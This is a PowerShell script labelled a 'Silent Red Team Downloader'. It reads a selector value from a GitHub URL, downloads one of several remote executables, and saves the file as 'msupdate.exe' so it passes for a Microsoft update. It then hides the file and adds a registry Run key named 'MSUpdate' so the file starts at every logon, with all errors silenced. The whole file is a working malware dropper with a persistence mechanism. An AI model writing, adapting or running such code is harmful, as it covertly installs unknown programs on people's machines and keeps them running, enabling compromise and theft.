# Silent Red Team Downloader + Persistence (No Desktop)
$ErrorActionPreference = 'SilentlyContinue'

# Fast value check
$valueUrl = "https://raw.githubusercontent.com/mrxssmaster-bot/test/refs/heads/main/value.txt"
try {
    $val = [int](Invoke-WebRequest -Uri $valueUrl -UseBasicParsing -TimeoutSec 8).Content.Trim()
} catch { $val = 0 }

# Choose correct payload
switch ($val) {
    0 { $payload = "ace.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
    1 { $payload = "ace1.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe" }
    2 { $payload = "ace2.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe" }
    default { $payload = "ace.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
}

# Use script's own directory if possible, otherwise fallback to C:\
$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not $scriptDir -or $scriptDir -like "*Temp*") {
    $scriptDir = "C:\"   # Fallback to C: root as you wanted
}

$finalExe = Join-Path $scriptDir "msupdate.exe"   # Renamed hidden name

# Download fast to the chosen location
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $finalExe)
} catch { exit }

# Hide the file
attrib +h $finalExe 2>$null

# Persistence - points to the renamed exe in the same folder
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MSUpdate"
Set-ItemProperty -Path $regPath -Name $regName -Value $finalExe -Type String -Force

# Clean exit
exit
